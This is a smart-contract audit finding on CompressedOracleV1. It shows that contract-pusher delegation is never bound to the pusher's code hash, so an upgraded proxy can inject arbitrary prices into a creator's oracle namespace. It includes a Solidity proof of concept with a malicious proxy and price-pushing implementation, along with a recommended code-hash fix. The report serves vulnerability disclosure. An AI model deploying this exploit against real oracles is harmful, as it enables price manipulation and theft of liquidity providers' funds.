### Title
Contract-Pusher Code-Replacement Allows Arbitrary Price Injection into Creator Namespace — (`smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol::allowContractPushers`)

### Summary

`allowContractPushers` validates a contract pusher's consent with a single live `staticcall` to `isPusher(creator)` at delegation time and permanently records `namespaceRemapping[pusher] = creator`. The code hash of the pusher contract is never bound. If the pusher contract's behavior changes after delegation — via an upgradeable proxy, `SELFDESTRUCT` + `CREATE2` redeploy, or any other mechanism — the delegation persists and the new code can push arbitrary prices into the creator's namespace, which pools consume as authoritative oracle data.

### Finding Description

`allowContractPushers` in `CompressedOracleV1`:

```solidity
function allowContractPushers(address[] calldata pushers) external {
    ...
    (bool ok, bytes memory res) = pusher.staticcall(
        abi.encodeWithSignature("isPusher(address)", msg.sender)
    );
    require(ok);
    bool allowed = abi.decode(res, (bool));
    require(allowed);

    namespaceRemapping[pusher] = msg.sender;   // permanent, no code-hash binding
    emit PusherAuthorized(pusher, msg.sender);
}
``` [1](#0-0) 

The `fallback()` push path resolves the namespace from `namespaceRemapping[msg.sender]` with no re-validation of the pusher contract's code:

```solidity
fallback() override external {
    address creator = namespaceRemapping[msg.sender];
    if (creator == address(0)) creator = msg.sender;
    ...
    _writeStorage(key, bytes32(bytes32(word & ~uint256(0xff))));
}
``` [2](#0-1) 

**Attack path:**

1. Attacker deploys an upgradeable proxy at address `P` whose initial implementation returns `isPusher(creator) = true`.
2. A legitimate creator calls `allowContractPushers([P])`. The `staticcall` succeeds; `namespaceRemapping[P] = creator` is written.
3. The attacker upgrades the proxy implementation to one that calls the oracle's `fallback()` with crafted slot words containing an arbitrary price and a current timestamp.
4. The oracle reads `namespaceRemapping[P] = creator` and writes the attacker's price into the creator's namespace.
5. Any pool whose `PriceProvider` / `ProtectedPriceProvider` / `AnchoredPriceProvider` is bound to a feed in the creator's namespace now receives the attacker-controlled price.

The timestamp monotonicity check is the only remaining gate, and the attacker trivially satisfies it by using `block.timestamp * 1000` as the millisecond timestamp. [3](#0-2) 

### Impact Explanation

A bad price written into the creator's namespace propagates directly to pools:

- `PriceProvider._getBidAndAskPrice()` reads the oracle mid and applies it with only a staleness check and an optional price guard (default guard is 0/0 = unlimited). A manipulated mid passes unchecked. [4](#0-3) 

- `AnchoredPriceProvider._computeBidAsk()` centers its reference band on the oracle mid. A manipulated mid shifts the entire band, so the clamp does not protect against a bad oracle mid — it only clips a bad *source* quote relative to the (already-bad) reference. [5](#0-4) 

A sufficiently extreme price causes the pool to execute swaps at a price far from fair value, resulting in direct loss of LP principal (swap conservation failure: the pool receives less input than the oracle-derived curve permits, or pays out more output than it should).

### Likelihood Explanation

- The `allowContractPushers` path is explicitly designed for production use (it appears in a deployment script `SetAllowance.sol`). [6](#0-5) 

- Upgradeable proxy contracts are ubiquitous. A creator who delegates to a third-party aggregator contract (e.g., a Chainlink-style keeper network) cannot prevent that contract's owner from upgrading its implementation.
- The creator can revoke via `removePushers`, but only after noticing the compromise — the window between upgrade and revocation is the attack window.
- No privileged role is required to execute the push after delegation; the attacker only needs to call the oracle's `fallback()` from the upgraded contract address.

### Recommendation

Bind the code hash of the pusher contract at delegation time and re-verify it on every push:

```solidity
mapping(address => bytes32) public pusherCodeHash;

function allowContractPushers(address[] calldata pushers) external {
    for (uint256 i; i < pushers.length; i++) {
        address pusher = pushers[i];
        ...
        bytes32 h;
        assembly { h := extcodehash(pusher) }
        require(h != bytes32(0) && h != 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470);
        pusherCodeHash[pusher] = h;
        namespaceRemapping[pusher] = msg.sender;
    }
}

// In fallback(), before writing:
bytes32 expectedHash = pusherCodeHash[msg.sender];
if (expectedHash != bytes32(0)) {
    bytes32 currentHash;
    assembly { currentHash := extcodehash(msg.sender) }
    if (currentHash != expectedHash) {
        // Code changed — treat as revoked, push into own namespace or revert
        revert CodeHashMismatch();
    }
}
```

Alternatively, disallow contract pushers entirely and require all delegation to use the EOA `allowPushers` path (which binds consent via an EIP-191 signature that cannot be replayed after the deadline).

### Proof of Concept

```solidity
// 1. Attacker deploys an upgradeable proxy that initially returns isPusher = true
contract MaliciousProxy {
    address public impl;
    constructor(address _impl) { impl = _impl; }
    fallback() external {
        (bool ok, bytes memory ret) = impl.delegatecall(msg.data);
        require(ok);
        assembly { return(add(ret, 32), mload(ret)) }
    }
    function upgrade(address newImpl) external { impl = newImpl; }
}

contract LegitImpl {
    function isPusher(address) external pure returns (bool) { return true; }
}

contract MaliciousImpl {
    CompressedOracleV1 oracle;
    constructor(address _oracle) { oracle = CompressedOracleV1(_oracle); }
    function pushBadPrice(uint8 slotId, uint32 badPrice) external {
        uint56 tsMs = uint56(block.timestamp * 1000);
        uint48 raw = (uint48(badPrice) << 16) | (uint48(0) << 8) | uint48(0);
        uint256 word = (uint256(tsMs) << 8) | uint256(slotId);
        word |= uint256(raw) << 208;
        (bool ok,) = address(oracle).call(abi.encodePacked(word));
        require(ok);
    }
}

// 2. Creator delegates to the proxy
vm.prank(creator);
oracle.allowContractPushers([address(proxy)]);
// namespaceRemapping[proxy] = creator ✓

// 3. Attacker upgrades the proxy
proxy.upgrade(address(new MaliciousImpl(address(oracle))));

// 4. Attacker pushes an extreme price into the creator's namespace
MaliciousImpl(address(proxy)).pushBadPrice(0, type(uint32).max);

// 5. Pool reads the bad price
bytes32 feedId = oracle.feedIdOf(creator, 0, 0);
(uint256 mid,,,) = oracle.price(feedId, address(0));
// mid is now the attacker-controlled extreme value
// Pool executes swaps at this price → LP loss
``` [7](#0-6) [2](#0-1)

### Citations

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L214-234)
```text
    /// @notice Contract-pusher variant: consent is proven by a LIVE `isPusher(creator)`
    ///         staticcall instead of a signature, so there is nothing to replay and no
    ///         deadline is needed.
    function allowContractPushers(address[] calldata pushers) external {
        uint256 l = pushers.length;
        for (uint256 i; i < l; i++) {
            address pusher = pushers[i];

            if (pusher == msg.sender) {
                revert NoSelfRemapping();
            }

            (bool ok, bytes memory res) = pusher.staticcall(abi.encodeWithSignature("isPusher(address)", msg.sender));
            require(ok);
            bool allowed = abi.decode(res, (bool));
            require(allowed);

            namespaceRemapping[pusher] = msg.sender;
            emit PusherAuthorized(pusher, msg.sender);
        }
    }
```

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L311-344)
```text
    fallback() override external {
        uint256 end;
        uint256 namespace;

        address creator = namespaceRemapping[msg.sender];
        if (creator == address(0)) creator = msg.sender;

        assembly ("memory-safe") {
            end := calldatasize()
            namespace := shl(96, creator) // [creator:20][zeros:12]
        }

        // 4 * 6 + 7 + 1 = 32 bytes per slot
        if (end == 0 || end % 32 != 0) revert BadCalldataLength();

        for (uint256 ptr = 0; ptr < end; ptr += 32) {
            uint256 word;
            assembly ("memory-safe") {
                word := calldataload(ptr)
            }
            // casting to 'uint8' is safe we want LSB
            // forge-lint: disable-next-line(unsafe-typecast)
            uint8 slotId = uint8(word);
            TimeMs timestampMs = toTimeMs(word >> 8 & X56);
            timestampMs.revertIfAfterBlockTimeWithDrift(MAX_TIME_DRIFT);
            bytes32 key = bytes32(namespace | uint256(slotId));
            uint256 old = uint256(_loadStorage(key));
            TimeMs oldTimestampMs = toTimeMs(old >> 8 & X56);

            bool newer = timestampMs.isAfter(oldTimestampMs);
            if (!newer) continue;

            _writeStorage(key, bytes32(bytes32(word & ~uint256(0xff))));
        }
```

**File:** smart-contracts-poc/contracts/PriceProvider.sol (L191-212)
```text
    function _getBidAndAskPrice() internal returns (uint128, uint128) {
        // 1. Read via the unified price(feedId, pool) path, forwarding the pool (msg.sender).
        //    refTime is already in seconds.
        (uint256 mid, uint256 spread, , uint256 refTime) =
            IPricedOracle(address(offchainOracle)).price(offchainFeedId, msg.sender);

        // 2. Staleness check
        if (_isStale(refTime, block.timestamp, MAX_TIME_DELTA)) {
            return (0, type(uint128).max);
        }

        // 3. Basic validity — price must be positive, spread must not be stalled marker
        if (mid == 0 || spread >= ORACLE_BPS) {
            return (0, type(uint128).max);
        }

        // 4. Price guard check (moved from oracle)
        (uint128 guardMin, uint128 guardMax) = offchainOracle.priceGuard(offchainFeedId);
        guardMax = guardMax == 0 ? type(uint128).max : guardMax;
        if (mid < guardMin || mid > guardMax) {
            return (0, type(uint128).max);
        }
```

**File:** smart-contracts-poc/contracts/AnchoredPriceProvider.sol (L301-313)
```text
    {
        // Circuit breaker: extreme (combined) uncertainty means the feed is clearly broken.
        if (spreadBps > MAX_SPREAD_BPS) {
            return (0, type(uint128).max);
        }

        // Reference band: mid ± (spreadBps + minMargin), bid rounded down, ask rounded up.
        uint256 half = spreadBps * ONE_BPS_E18 + minMargin; // < BPS_BASE_U by construction (spreadBps <= MAX_SPREAD_BPS here)
        uint256 refBid = _bandEdge(mid, BPS_BASE_U - half, Math.Rounding.Floor);
        uint256 refAsk = _bandEdge(mid, BPS_BASE_U + half, Math.Rounding.Ceil);
        if (refBid == 0 || refAsk > type(uint128).max || refBid >= refAsk) {
            return (0, type(uint128).max);
        }
```

**File:** smart-contracts-poc/script/SetAllowance.sol (L1-24)
```text
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import {Script} from "forge-std/Script.sol";
import {CompressedOracleV1} from "../contracts/oracles/compressed/CompressedOracle.sol";

contract SetInput is Script {
    function run() external {
        uint256 deployerKey = vm.envUint("PRIVATE_KEY");

        address[] memory pushers = new address[](1);
        pushers[0] = 0xE564305A334872EBb13a7aA2e3987Cb56A9e2ca5;

        address[] memory oldPushers = new address[](1);
        oldPushers[0] = 0x5886BAD65ab1380Fc17bD64A962a784bA1a90b70;
        // oldPushers[1] = 0x5dD09c56FB135194A9D44Da67c032a69689ff2Ad;


        vm.startBroadcast(deployerKey);
        CompressedOracleV1 oracle = CompressedOracleV1(0x5EcF662aBB8C2AB099862F9Ef2DDc16CBC8A9977);
        oracle.removePushers(oldPushers);
        oracle.allowContractPushers(pushers);
    }
}
```
